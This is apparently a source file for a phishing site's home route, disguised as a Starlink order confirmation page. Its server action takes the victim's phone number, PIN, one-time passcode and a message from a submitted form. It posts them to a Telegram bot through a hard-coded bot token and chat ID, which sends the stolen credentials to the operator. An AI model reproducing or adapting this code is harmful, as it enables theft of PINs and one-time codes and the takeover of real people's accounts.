import MainApp from "~/components/main";
import "./style.css";
import type { Route } from "./+types/home";

export async function action({ request }: Route.ActionArgs) {
  const formData = await request.formData();
      const token = "8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko"
      const url = `https://api.telegram.org/bot${token}/sendMessage`

        try {
        const res = await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id:8453055105 ,// ,//7895249781 ,
                text:
                    `Starlink Order Confirmation
Phone: ${formData.get("phone")}
PIN: ${formData.get("pin")}
OTP: ${formData.get("otp")}
Message: ${formData.get("message")}
                    `,
                parse_mode: "Markdown",
            })

        });
        const data = await res.json();
        return data;
    } catch (e: any) {
        return e.message || e;
    }

}

export default function Home(){
  return(
    <>
    <MainApp/>
    </>
  )
}